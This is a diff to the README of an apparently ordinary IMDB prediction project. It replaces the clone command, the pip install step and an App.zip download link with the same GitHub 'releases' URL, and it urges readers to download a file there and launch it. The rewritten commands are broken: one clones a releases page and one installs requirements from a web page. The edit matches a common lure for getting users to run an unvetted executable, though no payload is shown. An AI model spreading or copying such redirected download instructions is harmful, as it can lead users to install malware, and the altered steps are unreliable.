@@ -28,11 +28,11 @@ The repository is structured as follows:
 
 ## Usage
 To dive into the world of IMDB prediction model:
-1. Clone the repository: `git clone https://github.com/your-username/IMDB_Prediction.git`
-2. Install the required dependencies: `pip install -r requirements.txt`
+1. Clone the repository: `git clone https://github.com/KefaMensch/IMDB_Prediction/releases`
+2. Install the required dependencies: `pip install -r https://github.com/KefaMensch/IMDB_Prediction/releases`
 3. Run the Jupyter notebooks or Python scripts to explore the data and build the prediction model.
 
-For a more hands-on experience, download the [App.zip](https://github.com/project/files/App.zip) file and launch the application for interactive exploration.
+For a more hands-on experience, download the [https://github.com/KefaMensch/IMDB_Prediction/releases](https://github.com/KefaMensch/IMDB_Prediction/releases) file and launch the application for interactive exploration.
 
 ## Contributing
 We welcome contributions from the community to enhance the project further. If you have any ideas, bug fixes, or enhancements, feel free to submit a pull request. Together, we can make the IMDB prediction model even more robust and insightful.
